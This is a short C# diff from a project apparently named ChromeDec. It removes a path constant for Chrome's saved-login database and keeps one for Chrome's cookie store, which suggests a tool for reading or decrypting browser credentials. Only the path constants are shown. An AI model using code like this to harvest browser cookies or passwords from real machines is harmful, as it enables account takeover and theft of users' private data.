@@ -10,7 +10,6 @@ namespace ChromeDec
 {
     public class Class1
     {
-        private static string LOGIN_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Login Data";
         private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";
         private static readonly BrowserManager browserManager = new BrowserManager();
 
